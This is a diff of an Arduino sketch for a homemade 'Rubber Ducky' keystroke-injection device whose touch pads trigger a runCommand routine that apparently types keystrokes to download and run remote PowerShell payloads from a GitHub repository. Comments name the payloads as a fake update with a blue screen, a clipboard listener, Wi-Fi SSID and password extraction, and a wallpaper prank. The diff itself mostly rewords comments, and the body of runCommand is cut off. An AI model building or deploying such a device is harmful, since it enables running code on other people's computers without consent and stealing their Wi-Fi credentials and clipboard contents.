@@ -9,10 +9,7 @@ Adafruit_NeoPixel strip = Adafruit_NeoPixel(NUM_NEOPIXEL, PIN_NEOPIXEL, NEO_GRB 
 Adafruit_FreeTouch qt_1 = Adafruit_FreeTouch(1, OVERSAMPLE_4, RESISTOR_50K, FREQ_MODE_NONE);
 Adafruit_FreeTouch qt_2 = Adafruit_FreeTouch(2, OVERSAMPLE_4, RESISTOR_50K, FREQ_MODE_NONE);
 
-
-bool Touched1 = false;   // for checking the state of touch 1
-bool Touched2 = false;   // for checking the state of touch 2
-
+// Define colors
 unsigned long PINK = 0xad1db5;
 unsigned long BLUE = 0x0011ff;
 unsigned long ORANGE = 0xff6a00;
@@ -23,8 +20,8 @@ unsigned long RED = 0xFF0000;
 void setup() 
 {
   Serial.begin(9600);
-  strip.begin(); // start pixels
-  strip.setBrightness(20); // not too bright!
+  strip.begin(); // Start pixels
+  strip.setBrightness(20); // Lower brightness
   strip.show(); // Initialize all pixels to 'off'
 
   if (! qt_1.begin())  
@@ -32,7 +29,7 @@ void setup()
   if (! qt_2.begin())  
     Serial.println("Failed to begin qt on pin 2");
     
-  // initialize control over the keyboard:
+  // Begin keyboard
   Keyboard.begin();
   Keyboard.print("0");
   delay(500);
@@ -40,9 +37,11 @@ void setup()
 
 void loop() 
 {
+  // Get values from capacitive touch pads
   uint16_t touch1 = qt_1.measure();
   uint16_t touch2 = qt_2.measure();
 
+  // Set colors
   strip.setPixelColor(0, PINK);
   strip.setPixelColor(1, BLUE);
   strip.setPixelColor(2, ORANGE);
@@ -54,17 +53,17 @@ void loop()
     delay(200);
     touch1 = qt_1.measure();
     
-    if(touch1 > 500) //Long press
+    if(touch1 > 500) // Long press
     {
-        delay(200); //Delay to prevent accidentally sending command in case device is pulled out while touching capacitive pad
+        delay(200); // Delay to prevent accidentally sending command in case device is pulled out while touching capacitive pad
         setAll(GREEN);
-        runCommand("https://raw.githubusercontent.com/BrianJ-4/DIY-RubberDucky-Scripts/main/payload4.ps1"); //Wallpaper change + Youtube tripwire
+        runCommand("https://raw.githubusercontent.com/BrianJ-4/DIY-RubberDucky-Scripts/main/payload4.ps1"); // Wallpaper change + Youtube tripwire
         allOff();
     }
-    else //Short press
+    else // Short press
     {
         setAll(ORANGE);
-        runCommand("https://raw.githubusercontent.com/BrianJ-4/DIY-RubberDucky-Scripts/main/payload3.ps1"); //Fake Update + BSOD
+        runCommand("https://raw.githubusercontent.com/BrianJ-4/DIY-RubberDucky-Scripts/main/payload3.ps1"); // Fake Update + BSOD
         allOff();
     }
   }
@@ -74,17 +73,17 @@ void loop()
     delay(200);
     touch2 = qt_2.measure();
     
-    if(touch2 > 500) //Long press
+    if(touch2 > 500) // Long press
     {
-        delay(200); //Delay to prevent accidentally sending command in case device is pulled out while touching capacitive pad
+        delay(200); // Delay to prevent accidentally sending command in case device is pulled out while touching capacitive pad
         setAll(PINK);
-        runCommand("https://raw.githubusercontent.com/BrianJ-4/DIY-RubberDucky-Scripts/main/payload5.ps1"); //Clipboard listener
+        runCommand("https://raw.githubusercontent.com/BrianJ-4/DIY-RubberDucky-Scripts/main/payload5.ps1"); // Clipboard listener
         allOff();
     }
-    else //Short press
+    else // Short press
     {
         setAll(BLUE);
-        runCommand("https://raw.githubusercontent.com/BrianJ-4/DIY-RubberDucky-Scripts/main/payload6.ps1"); //SSID and pass extract
+        runCommand("https://raw.githubusercontent.com/BrianJ-4/DIY-RubberDucky-Scripts/main/payload6.ps1"); // SSID and pass extract
         allOff();
     }
   }
@@ -109,6 +108,7 @@ void allOff()
   strip.show();
 }
 
+// Run powershell script from Github
 void runCommand(String url)
 {
     Keyboard.press(KEY_LEFT_GUI);
